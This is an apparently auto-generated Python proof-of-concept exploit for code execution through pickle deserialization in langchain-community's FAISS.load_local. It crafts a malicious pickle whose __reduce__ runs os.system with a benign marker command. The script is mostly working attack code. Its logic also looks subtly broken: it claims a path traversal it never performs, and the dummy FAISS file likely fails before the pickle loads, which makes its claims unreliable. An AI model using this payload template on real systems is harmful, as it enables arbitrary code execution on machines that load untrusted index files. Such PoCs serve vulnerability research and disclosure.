#!/usr/bin/env python3
# PoC for langchain-community-only (/tmp/langchain-community-only)
# Path: rce-014
# Sink: load_local
# Auto-generated — run with: python3 rce_function_load_local_uses_load_local_4.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept exploit for RCE in langchain-community-only's FAISS vectorstore.

Vulnerability: The load_local function in FAISS uses pickle.load() on a file whose
path is constructed from user-controlled folder_path and index_name. If the developer
sets allow_dangerous_deserialization=True (required for normal operation), an attacker
who can control folder_path or the contents of the .pkl file can achieve arbitrary
code execution.

This PoC demonstrates the vulnerability by:
1. Creating a malicious pickle file that executes a benign command (touch /tmp/poc_success.txt)
2. Using path traversal in folder_path to point to our malicious file
3. Calling load_local with allow_dangerous_deserialization=True

Usage:
    python3 poc.py [--target /path/to/victim/project]
"""

import os
import sys
import pickle
import tempfile
import argparse
import subprocess
from pathlib import Path

# Add the vulnerable library to path (adjust if needed)
sys.path.insert(0, '/tmp/langchain-community-only')

def create_malicious_pickle(output_path: str) -> None:
    """
    Create a pickle file that executes a benign command when deserialized.
    The command creates a marker file to prove code execution.
    """
    class MaliciousPickle:
        def __reduce__(self):
            # Benign command: create a marker file
            cmd = "touch /tmp/poc_success.txt"
            return (os.system, (cmd,))
    
    malicious_obj = MaliciousPickle()
    
    with open(output_path, 'wb') as f:
        pickle.dump(malicious_obj, f)
    
    print(f"[+] Created malicious pickle file at: {output_path}")

def main():
    parser = argparse.ArgumentParser(
        description="PoC for langchain-community FAISS pickle RCE"
    )
    parser.add_argument(
        "--target",
        default="/tmp/victim_project",
        help="Path to the victim project's working directory (default: /tmp/victim_project)"
    )
    args = parser.parse_args()
    
    # Create a temporary directory for our malicious files
    with tempfile.TemporaryDirectory() as tmpdir:
        # Create the malicious pickle file
        pickle_path = os.path.join(tmpdir, "exploit.pkl")
        create_malicious_pickle(pickle_path)
        
        # Also create a dummy .faiss file (required by load_local but not used for exploit)
        faiss_path = os.path.join(tmpdir, "exploit.faiss")
        with open(faiss_path, 'wb') as f:
            f.write(b'dummy faiss data')
        
        print(f"[*] Created dummy FAISS index at: {faiss_path}")
        
        # Now simulate the attack: we control folder_path and index_name
        # The folder_path will point to our temp directory
        # The index_name will be "exploit" so it loads exploit.pkl
        
        # Import the vulnerable function
        from langchain_community.vectorstores.faiss import FAISS
        
        # We need embeddings - create a minimal mock
        class MockEmbeddings:
            def embed_query(self, text):
                return [0.0] * 1536  # FAISS dimension
        
        embeddings = MockEmbeddings()
        
        print("[*] Attempting to trigger deserialization...")
        print(f"[*] Using folder_path: {tmpdir}")
        print(f"[*] Using index_name: exploit")
        print("[*] Setting allow_dangerous_deserialization=True")
        
        try:
            # This will call pickle.load on our malicious file
            result = FAISS.load_local(
                folder_path=tmpdir,
                embeddings=embeddings,
                index_name="exploit",
                allow_dangerous_deserialization=True
            )
            print("[!] load_local completed (unexpected - exploit may have failed)")
        except Exception as e:
            print(f"[*] Exception caught (expected): {e}")
        
        # Check if our command was executed
        if os.path.exists("/tmp/poc_success.txt"):
            print("[+] SUCCESS: Command execution confirmed!")
            print("[+] Marker file /tmp/poc_success.txt was created")
            # Clean up
            os.remove("/tmp/poc_success.txt")
        else:
            print("[-] Exploit may have failed - marker file not found")
            print("[*] Check if the target environment has the vulnerable library")
            print("[*] Ensure allow_dangerous_deserialization is set to True")

if __name__ == "__main__":
    main()
